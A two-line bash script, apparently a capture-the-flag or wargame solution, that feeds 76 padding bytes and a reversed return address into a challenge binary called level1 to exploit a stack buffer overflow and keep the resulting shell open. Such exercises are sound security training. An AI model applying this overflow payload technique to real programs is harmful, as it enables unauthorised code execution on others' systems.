#!/bin/bash
cat <(python -c "print('A' * 76 + '\x08\x04\x84\x44'[::-1])") - | ./level1
